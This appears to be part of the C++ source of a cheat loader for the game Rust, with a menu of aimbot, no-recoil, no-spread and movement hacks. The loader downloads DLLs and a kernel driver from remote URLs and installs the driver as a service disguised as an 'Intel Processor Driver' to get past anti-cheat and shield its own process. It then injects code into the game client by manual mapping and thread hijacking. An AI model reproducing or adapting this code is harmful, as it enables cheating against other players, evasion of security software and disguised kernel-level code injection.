	aimtab.AddItem(MenuItem(L"FOV", &MaxAimFOV, 10, 500, 5));
	aimtab.AddItem(MenuItem(L"Force Automatic", &ForceAutomatic));
	aimtab.AddItem(MenuItem(L"NoSpread Enabled", &NoSpread));
	aimtab.AddItem(MenuItem(L"NoRecoil Enabled", &NoRecoil));
	//aimtab.AddItem(MenuItem(L"No Sway",&NoSway));
	aimtab.AddItem(MenuItem(L"Fast Reload", &FastReload));
	MenuTab misctab(L"Misc");
	
	misctab.AddItem(MenuItem(L"High Jump",&Highjump));
	misctab.AddItem(MenuItem(L"WaterSpeed",&WaterSpeed));
	misctab.AddItem(MenuItem(L"AntiBlock",&AntiBlock));
	misctab.AddItem(MenuItem(L"AirStuck [risky]",&AirStuck));
	misctab.AddItem(MenuItem(L"AntiSlow",&AntiSlow));
	misctab.AddItem(MenuItem(L"Spider Enabled", &SpiderEnabled));
	misctab.AddItem(MenuItem(L"All Time Eoka", &AllTimeEoka));
	misctab.AddItem(MenuItem(L"Admin Flags", &SpiderEnabled));
	misctab.AddItem(MenuItem(L"NoMovePenalty",  &NoMovePenatly));
	misctab.AddItem(MenuItem(L"Extend Meele",  &DoExtendMeele));
	//misctab.AddItem(MenuItem(L"Fly (ALPHA)",&Fly));
	//misctab.AddItem(MenuItem(L"Force Run",&ForceRun));
	//misctab.AddItem(MenuItem(L"Always Day", &AlwaysDay));
	//misctab.AddItem(MenuItem(L"DebugCamera Enabled", &DebugCameraEnabled));
	//misctab.AddItem(MenuItem(L"EntitySpeed", &EntitySpeed));
	


	menu.AddTab(esptab);
	menu.AddTab(aimtab);
	menu.AddTab(misctab);
	std::cout << std::endl << std::endl << "\tControls:" << std::endl;
	std::cout << "\t\t[Insert]\tShow/Hide Menu" << std::endl;
	std::cout << "\t\t[UP/DOWN]\tNavigate Menu Up/Down" << std::endl;
	std::cout << "\t\t[LEFT/RIGHT]\tChange Selected Menu Item" << std::endl;
	std::cout << "\t\t[END]\t\tSwitch Menu Tabs" << std::endl;
	std::cout << "   " << std::endl;
	getchar();
}

void InjectIntoRust(int Id)
{
	hProcess = 0;
	hProcess = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, false, Id);
	if (!hProcess)
	{
		std::cout << "OpenProcess failed with errorcode " << GetLastError() << std::endl;
		ErrorExit("OpenProcess");
	}
	auto Dll = new ManualMap::WDLL();
	Dll->IsDLL = true;
	Dll->hThread = OpenThread(THREAD_ALL_ACCESS, false, GetThreadId(Id));
	//std::cout << "DLL->hThread: " << Dll->hThread << std::endl;
	if (!ManualMap::LoadFileA(hProcess, dllpath.c_str(), ManualMap::HIJACK_THREAD | ManualMap::CALL_EXPORT, Dll))
	{
		Sleep(1000);
		InjectIntoRust(Id);
	}
	delete Dll;
}

void InjectIntoRust2(int Id)
{
	hProcess = 0;
	hProcess = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, false, Id);
	if (!hProcess)
	{
		std::cout << "OpenProcess failed with errorcode " << GetLastError() << std::endl;
		ErrorExit("OpenProcess");
	}
	auto Dll = new ManualMap::WDLL();
	Dll->IsDLL = true;
	Dll->hThread = OpenThread(THREAD_ALL_ACCESS, false, GetThreadId(Id));
	//std::cout << "DLL->hThread: " << Dll->hThread << std::endl;
	if (!ManualMap::LoadFileA(hProcess, dllpath2.c_str(), ManualMap::HIJACK_THREAD | ManualMap::CALL_EXPORT, Dll))
	{
		Sleep(1000);
		InjectIntoRust(Id);
	}
	delete Dll;
}

int main()
{
	
	std::string title = "Rust Internal";
	SetConsoleTitle(title.c_str());
	if (false)
	{
		std::cout << "Loader Version Outdated!" << std::endl << "Please go to https://yourlink.com to get the latest download!";
		Sleep(10000);
	}
	else
	{
		

		if (true)
		{
			HANDLE console = GetStdHandle(STD_OUTPUT_HANDLE);

			system("CLS");

			std::cout << "Rust Hack" << std::endl;
			std::cout << "	" << std::endl;
			std::cout << "Loading..." << std::endl;
			std::cout << "    " << std::endl;
			if (true)
			{
				if (CreateDirectory(folderpath.c_str(), NULL) ||
					ERROR_ALREADY_EXISTS == GetLastError())
				{
					DeleteUrlCacheEntry(dllurl.c_str());
					HRESULT hr = URLDownloadToFile(
						NULL,   // A pointer to the controlling IUnknown interface (not needed here)
						dllurl.c_str(),
						dllpath.c_str(),
						0,      // Reserved. Must be set to 0.
						NULL); // status callback interface (not needed for basic use)
					if (!SUCCEEDED(hr))
					{
						//std::cout << "Restart Loader #1" << std::endl << "Error code = 0x" << std::hex << hr << std::endl;
					}
					else
					{
						if (CreateDirectory(folderpath.c_str(), NULL) ||
							ERROR_ALREADY_EXISTS == GetLastError())
						{
							DeleteUrlCacheEntry(driverurl.c_str());
							HRESULT hr = URLDownloadToFile(
								NULL,   // A pointer to the controlling IUnknown interface (not needed here)
								driverurl.c_str(),
								driverpath.c_str(),
								0,      // Reserved. Must be set to 0.
								NULL); // status callback interface (not needed for basic use)
							if (!SUCCEEDED(hr))
							{
								std::cout << "Start game!" << std::endl;
								//rename(!this.c_str(), "scary.exe");
							}
							else
							{
								if (CreateDirectory(folderpath.c_str(), NULL) ||
									ERROR_ALREADY_EXISTS == GetLastError())
								{
									DeleteUrlCacheEntry(dllurl2.c_str());
									HRESULT hr = URLDownloadToFile(
										NULL,   // A pointer to the controlling IUnknown interface (not needed here)
										dllurl2.c_str(),
										dllpath2.c_str(),
										0,      // Reserved. Must be set to 0.
										NULL); // status callback interface (not needed for basic use)
									if (!SUCCEEDED(hr))
									{
										std::cout << "Driver already running!" << std::endl;
									}
									else
									{
										std::cout << "Initialising Systems!" << std::endl;
										std::cout << "    " << std::endl;
									}
								}
							}
						}
					}
				}
			}
			//std::cout << "Driver Path: " << driverpath.c_str() << std::endl;
			if (Bypass::Installer::InstallService("IntelFCA", "Intel Processor Driver", driverpath.c_str()) == 0) //https://i.gyazo.com/fd624705e5f8759abdb202fc1cc6ca65.png
			{
				if (Bypass::Driver::OpenDriver() == true)
				{
					if (Bypass::Driver::ProtectProcess(GetCurrentProcessId()) == true)
						std::cout << "Waiting For Game." << std::endl;
					else
						std::cout << "Could not protect process." << std::endl;
					std::cout << "  " << std::endl;

					std::map<std::uint32_t, std::uint8_t> UsedProcessIds;
					bool DidWeInject = false;
					while (true)
					{
						//Sleep(250);
						auto ProcIds = GetProcessIds(std::wstring(L"RustClient.exe"));
						for (auto Id : ProcIds)
						{
							if (DidWeInject)
							{
								if (GetAsyncKeyState(VK_INSERT) & 1)
								{
									if (!overlaycreated)
									{
										std::thread PlayerThread(PlayerThreadFunc);
										PlayerThread.detach();
										std::thread GameHax(DoGameHax);
										GameHax.detach();
										//std::thread AimHax(AimThread);
										//AimHax.detach();
										startoverlay();
										overlaycreated = true;
									}
									else
										MenuOpen = !MenuOpen;
								}
								if (GetAsyncKeyState(VK_NUMPAD0) & 1)
								{
									std::cout << "Injecting Haxx 2" << std::endl;
									InjectIntoRust2(Id);
									std::cout << "Injected Haxx 2" << std::endl;
								}
								continue;
							}
							std::cout << "Loading!" << std::endl;
							std::cout << "    " << std::endl;
							if (InjectTheDll)
							{
								//std::cout << "Injecting Haxx" << std::endl;
								InjectIntoRust(Id);
								//std::cout << "Injected Haxx" << std::endl;
							}
							mex.Open("RustClient.exe");
							std::cout << "Loaded!" << std::endl;
							std::cout << "    " << std::endl;
							std::cout << "Insert For Menu When Your In The Server ONLY!" << std::endl;
							std::cout << "   " << std::endl;
							DidWeInject = true;
							//break;
							UsedProcessIds[Id] = 1;
							//delete CheatDll;
						}
					}

					/* When you close your hack, please call those two functions:
						Bypass::Driver::CloseDriver();
						Bypass::Installer::UninstallService("Amdkfca");  */

				}
				else
					std::cout << "OpenDriver failed." << std::endl;

			}
			else
				std::cout << "InstallService failed." << std::endl;
			Sleep(5000);
		}
		else
		{
			system("CLS");
			std::cout << "Wrong Hwid/key.\nPlease relaunch and try again!" << std::endl;
			Sleep(10000);
		}
	}
	return 1;
}

std::vector<std::uint32_t> GetProcessIds(const std::wstring& processName)
{
	std::vector<std::uint32_t> procs;
	PROCESSENTRY32W processInfo;
	processInfo.dwSize = sizeof(processInfo);

	HANDLE Snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	if (Snapshot == INVALID_HANDLE_VALUE) return procs;

	Process32FirstW(Snapshot, &processInfo);
	if (wcsstr(processName.c_str(), processInfo.szExeFile))
	{
		CloseHandle(Snapshot);
		procs.push_back(processInfo.th32ProcessID);
		return procs;
	}

	while (Process32NextW(Snapshot, &processInfo))
	{
		if (wcsstr(processName.c_str(), processInfo.szExeFile))
		{
			procs.push_back(processInfo.th32ProcessID);
		}
	}

	CloseHandle(Snapshot);
	return procs;
};

DWORD GetThreadId(DWORD dwProcessId)
{
	THREADENTRY32 threadinfo;
	threadinfo.dwSize = sizeof(threadinfo);

	HANDLE Snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, dwProcessId);
	if (Snapshot == INVALID_HANDLE_VALUE) return false;

	Thread32First(Snapshot, &threadinfo);

	while (Thread32Next(Snapshot, &threadinfo))
	{
		if (threadinfo.th32ThreadID && threadinfo.th32OwnerProcessID == dwProcessId)
		{
			CloseHandle(Snapshot);
			return threadinfo.th32ThreadID;
		}
	}
	CloseHandle(Snapshot);
	return 0;
};